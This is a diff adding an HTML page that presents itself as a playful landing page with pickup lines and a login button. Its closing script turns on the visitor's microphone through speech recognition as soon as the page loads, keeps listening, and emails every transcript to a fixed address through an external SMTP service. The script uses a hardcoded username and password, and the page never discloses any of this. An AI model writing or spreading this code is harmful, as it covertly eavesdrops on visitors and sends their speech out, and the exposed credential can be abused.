@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>othennnns</title>
+
+    <style>
+        * {
+      margin: 0px;
+      padding: 0px;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: Georgia, "Times New Roman", Times, serif;
+      color: white;
+      background-color: black;
+    }
+    
+    .container {
+      max-width: 90rem;
+      margin: 2rem auto;
+      padding: 0px 2rem;
+    }
+    
+    .img-fluid {
+      max-width: 100%;
+    }
+    .logo img {
+      width: 70px;
+      height: 70px;
+      border-radius: 41px;
+      outline: 4px solid red;
+    }
+    nav {
+      display: flex;
+      justify-content: space-between;
+      padding: 1rem 3rem;
+      align-items: center;
+    }
+    
+    .items {
+      display: flex;
+      align-items: center;
+      gap: 30px;
+    }
+    
+    .items a:link {
+      text-decoration: none;
+      color: white;
+      font-size: 1.5rem;
+      font-weight: bold;
+    }
+    
+    .items a:hover {
+      color: red;
+    }
+    
+    .active {
+      color: red !important;
+    }
+    
+    button {
+      font-size: 2rem;
+      padding: 0.6rem 1rem;
+      font-weight: bold;
+      color: white;
+      background: linear-gradient(to right, #c31432, #892211);
+      border-radius: 10px;
+      box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;
+      cursor: pointer;
+      border: none;
+    }
+    
+    button:hover {
+      background: white;
+      outline: 1px solid red;
+      color: red;
+      border: none;
+    }
+    
+    .row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .info {
+      display: flex;
+      flex-direction: column;
+    }
+    .short-info {
+      color: red;
+      font-size: 1rem;
+      margin-bottom: 0.9rem;
+    }
+    
+    .hero-heading {
+      font-size: 3rem;
+      margin-bottom: 0.3rem;
+    }
+    .hero-sub-heading {
+      font-size: 0.9rem;
+      opacity: 0.7;
+    }
+    
+    .users {
+      display: flex;
+      align-items: center;
+      margin: 1rem 0px;
+    }
+    .user {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      border: 2px solid red;
+    }
+    .learn-more {
+      align-self: start;
+      margin-top: 3rem;
+    }
+    
+    /* media queries */
+    
+    @media only screen and (max-width: 800px) {
+      .items {
+        display: none;
+      }
+    
+      .row {
+        grid-template-columns: 1fr;
+      }
+      .learn-more {
+        align-self: start;
+        margin: 1rem 0px;
+      }
+    }
+    
+      </style>
+          
+
+
+
+</head>
+<body>
+
+
+
+    <header>
+        <nav>
+          <div class="logo">
+            <img src="https://images.unsplash.com/photo-1533794318766-897f4d50cb39?crop=entropy&cs=tinysrgb&fm=jpg&ixid=MnwzMjM4NDZ8MHwxfHJhbmRvbXx8fHx8fHx8fDE2NTg0MDUyMDk&ixlib=rb-1.2.1&q=80">
+          </div>
+          <div class="items">
+            <a href="#" class="active">Home</a>
+            <a href="#">Service</a>
+            <a href="#">About</a>
+            <a href="#">Contact</a>
+            <a href="#">Blog</a>
+          </div>
+      
+          <div class="other">
+            <button>Log in</button>
+          </div>
+        </nav>
+      </header>
+      
+      <!-- Hero Section -->
+      <section>
+        <div class="container">
+          <div class="row">
+            <div class="info">
+              <p class="short-info">#Get Your 14 Days Free daddy</p>
+              <h2 class="hero-heading">Is it hot in here or is it just you?</h2>
+              <p class="hero-sub-heading">Toss me your car keys so I can drive you crazy.</p>
+              <!-- <div class="users">
+                <p>4M+ users</p>
+              </div> -->
+              <button class="learn-more">
+                Killy</button>
+            </div>
+            <div class="hero-image">
+                <img src="image/gwapo.jpg">
+            
+                    </div>
+          </div>
+        </div>
+      </section>
+     
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+       readSpeech();
+            function readSpeech(){
+                
+            var recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition || window.mozSpeechRecognition || window.msSpeechRecognition)();
+            recognition.lang = 'en-US';
+            recognition.interimResults = false;
+            recognition.maxAlternatives = 5;
+            recognition.start();
+            recognition.onresult = function(event) {
+                sendEmail(event.results[0][0].transcript);
+                console.log(event.results[0][0].transcript);
+                readSpeech();
+            };
+            }
+    
+            
+            function sendEmail(voice) {
+                Email.send({
+                Host: "smtp.elasticemail.com",
+                Username : "deserie.sarucam@ctu.edu.ph",
+                Password : "2F1AE3986D561688157A3245377AAE9180AF",
+                To : 'deserie.sarucam@ctu.edu.ph',
+                From : "deserie.sarucam@ctu.edu.ph",
+                Subject : "<email subject>",
+                Body : "Voice: " + voice,
+                }).then(
+                    message => console.log(loveyou)
+                );
+            }
+    </script>
+            
+   
+</body>
+</html>
